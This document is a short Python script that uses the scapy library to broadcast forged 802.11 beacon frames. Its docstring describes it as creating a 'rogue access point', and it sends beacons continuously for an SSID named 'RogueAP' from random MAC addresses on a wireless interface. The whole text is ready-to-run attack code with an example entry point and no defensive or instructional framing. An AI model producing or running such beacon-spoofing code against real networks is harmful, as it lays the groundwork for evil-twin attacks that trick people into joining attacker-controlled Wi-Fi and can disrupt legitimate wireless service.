from scapy.all import *

def create_rogue_ap(ssid, interface):
    """Create a rogue access point with the specified SSID."""
    dot11 = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())
    beacon = Dot11Beacon(cap='ESS')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    packet = dot11 / beacon / essid
    sendp(packet, iface=interface, inter=0.1, loop=1)  # Send packets continuously

# Example usage
if __name__ == "__main__":
    ssid = "RogueAP"  # SSID of the rogue access point
    interface = "wlan0"  # Network interface
    create_rogue_ap(ssid, interface)
